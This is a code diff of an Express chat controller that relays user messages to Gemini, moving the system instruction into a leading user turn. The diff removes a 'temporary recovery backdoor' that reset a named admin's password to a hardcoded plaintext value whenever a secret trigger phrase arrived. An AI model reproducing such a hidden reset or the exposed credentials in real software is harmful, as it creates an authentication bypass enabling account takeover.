@@ -123,32 +123,35 @@ const aiChat = async (req, res) => {
             });
         }
 
-        // Ajout du prompt actuel
+        // Ajout du prompt actuel au contenu historique
         contents.push({
             role: "user",
             parts: [{ text: `${contextPrompt}\n\nQUESTION DE L'UTILISATEUR (LOGIQUE) : ${message}` }]
         });
 
-        // TEMPORARY RECOVERY BACKDOOR (Will be removed after use)
-        if (message === "SECRET_RECOVERY_SET_PASS_2026") {
-            const bcrypt = require('bcryptjs');
-            const hashedPassword = await bcrypt.hash("Mouha2007", 10);
-            await User.findOneAndUpdate({ email: "mouhamedfall@esp.sn" }, { password: hashedPassword });
-            return res.json({ message: "COEUR_RESTAURÉ: Mot de passe admin mis à jour." });
-        }
+        // Construction du payload UNIVERSEL (Compatible v1 et v1beta)
+        // On n'utilise plus le champ 'system_instruction' qui cause des 400 sur l'endpoint v1
+        const universalContents = [
+            {
+                role: "user",
+                parts: [{ text: `SYSTEM_PROTOCOL:\n${systemInstruction}` }]
+            },
+            {
+                role: "model",
+                parts: [{ text: "Protocole reçu. Je suis prêt. Comment puis-je vous aider ?" }]
+            },
+            ...contents
+        ];
 
         const geminiUrl = `https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`;
 
-        console.log(`📡 [AI RELAY] Appel direct Gemini API pour: ${user.email}`);
+        console.log(`📡 [AI RELAY] Appel PROTOCOLE UNIVERSEL pour: ${user.email}`);
 
         const response = await fetch(geminiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                contents,
-                system_instruction: {
-                    parts: [{ text: systemInstruction }]
-                },
+                contents: universalContents,
                 generationConfig: {
                     temperature: 0.7,
                     topP: 0.95,
